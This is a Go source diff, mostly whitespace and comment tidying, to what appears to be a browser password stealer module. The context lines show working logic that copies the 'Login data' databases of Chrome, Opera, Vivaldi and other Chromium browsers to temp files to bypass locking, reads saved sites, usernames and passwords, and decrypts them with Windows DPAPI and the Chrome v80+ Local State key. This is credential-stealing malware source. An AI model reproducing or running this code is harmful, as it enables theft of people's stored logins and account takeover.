@@ -19,19 +19,18 @@ func chromeModuleStart(path string) ([]common.UrlNamePass, bool) {
 		profilesWithTrash, _, _, _ := jsonparser.Get(fileWithUserData, "profile")
 
 		var profileNames []string
-		
+
 		//todo delete this piece of... is there a more smartly way?
 		jsonparser.ObjectEach(profilesWithTrash, func(key []byte, value []byte, dataType jsonparser.ValueType, offset int) error {
 			profileNames = append(profileNames, string(key))
 			return nil
 		}, "info_cache")
 
+		// Create temporary databases for bypass locking
 		var temporaryDbNames []string
 		for _, profileName := range profileNames {
 			dbPath := fmt.Sprintf("%s\\%s\\Login data", path, profileName)
 			if _, err := os.Stat(dbPath); err == nil {
-				//randomDbName := common.RandStringRunes(10)
-
 				file, _ := ioutil.TempFile(os.TempDir(), "prefix")
 				err := common.CopyFile(dbPath, file.Name())
 				if err != nil {
@@ -53,6 +52,7 @@ func chromeModuleStart(path string) ([]common.UrlNamePass, bool) {
 			}
 			var actionUrl, username, password string
 			var data []common.UrlNamePass
+
 			for rows.Next() {
 				rows.Scan(&actionUrl, &username, &password)
 
@@ -64,7 +64,7 @@ func chromeModuleStart(path string) ([]common.UrlNamePass, bool) {
 				decryptedPassword, errUnprotectData := common.Win32CryptUnprotectData(password, false)
 
 				if errUnprotectData != nil {
-					// Chrome ver. 80+ creds extract
+					// Chrome v80+ creds extract
 					if strings.Contains(path, "\\Google\\Chrome\\User Data") {
 
 						keyFilePath := os.Getenv("USERPROFILE") + "/AppData/Local/Google/Chrome/User Data/Local State"
@@ -100,8 +100,8 @@ func chromeModuleStart(path string) ([]common.UrlNamePass, bool) {
 			os.Remove(tmpDB)
 			return data, true
 		}
-			// remove already used database
-		}
+		// remove already used database
+	}
 	return nil, false
 }
 
@@ -110,14 +110,14 @@ var (
 		Paths for more interesting and popular browsers for us
 	*/
 	chromePathsUserData = []string{
-		common.LocalAppData + "\\Google\\Chrome\\User Data",        // Google chrome
-		common.AppData + "\\Opera Software\\Opera Stable",          // Opera
+		common.LocalAppData + "\\Google\\Chrome\\User Data", // Google chrome
+		common.AppData + "\\Opera Software\\Opera Stable",   // Opera
 		// common.LocalAppData + "\\Yandex\\YandexBrowser\\User Data", // Yandex browser
-		common.LocalAppData + "\\Vivaldi\\User Data",               // Vivaldi
-		common.LocalAppData + "\\CentBrowser\\User Data",           // CentBrowser
-		common.LocalAppData + "\\Amigo\\User Data",                 // Amigo (RIP)
-		common.LocalAppData + "\\Chromium\\User Data",              // Chromium
-		common.LocalAppData + "\\Sputnik\\Sputnik\\User Data",      // Sputnik
+		common.LocalAppData + "\\Vivaldi\\User Data",          // Vivaldi
+		common.LocalAppData + "\\CentBrowser\\User Data",      // CentBrowser
+		common.LocalAppData + "\\Amigo\\User Data",            // Amigo (RIP)
+		common.LocalAppData + "\\Chromium\\User Data",         // Chromium
+		common.LocalAppData + "\\Sputnik\\Sputnik\\User Data", // Sputnik
 	}
 )
 
